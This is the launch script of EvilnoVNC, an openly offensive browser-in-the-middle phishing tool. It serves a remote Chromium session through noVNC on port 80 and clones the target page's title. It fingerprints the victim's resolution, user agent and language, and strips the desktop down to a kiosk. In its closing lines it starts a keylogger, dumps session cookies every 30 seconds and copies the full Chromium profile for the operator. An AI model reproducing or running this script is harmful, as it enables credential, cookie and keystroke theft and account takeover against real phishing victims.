#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

DISPLAY=:0
sudo rm -f /tmp/resolution.txt
sudo rm -f /tmp/client_info.txt
sudo rm -f /tmp/.X${DISPLAY#:}-lock

echo "URL=$WEBPAGE" > php.ini
sudo /bin/bash -c "php -q -S 0.0.0.0:80 &" > /dev/null 2>&1

while [ ! $(cat /tmp/client_info.txt 2> /dev/null | grep "x24") ]; do sleep 1 ; done
cat /tmp/client_info.txt | jq .RESOLUTION | tr -d "\"" > /tmp/resolution.txt ; sleep 1
export RESOLUTION=$(cat /tmp/resolution.txt)
echo 'starting with' $RESOLUTION
sudo pkill -9 php

nohup sudo /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep 1; done
nohup sudo startxfce4 > /dev/null || true &

nohup sudo x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup sudo /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980 &
nohup sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:localhost:5980 &

URL=$(head -1 php.ini | cut -d "=" -f 2)
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
TITLE=$(curl -sk $URL | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")
echo $TITLE > title.txt && sed -i "4s/.*/$(head -1 title.txt)/g" noVNC/index.html
sudo chmod a-rwx /usr/bin/xfce4-panel && sudo chmod a-rwx /usr/bin/thunar
sudo chmod a-rwx /usr/bin/xfce4-terminal && sudo mkdir Downloads 2> /dev/null
sudo mkdir Downloads/Default 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
while read -rd $'' line; do export "$line" ; done < <(jq -r <<<"$values" 'to_entries|map("\(.key)=\"\(.value)\"\u0000")[]' /tmp/client_info.txt)
unzip -n kiosk.zip && sleep 3 && /usr/bin/chromium --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start --user-agent="${USERAGENT//\"}" --accept-lang=${CLIENT_LANG//\"} &

nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt" &
nohup /bin/bash -c "python3 /home/user/keylogger.py 2> log.txt" &
nohup /bin/bash -c "while true ; do sleep 30 ; python3 cookies.py > /home/user/Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; cp -R -u /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &

while true ; do sleep 30 ; done
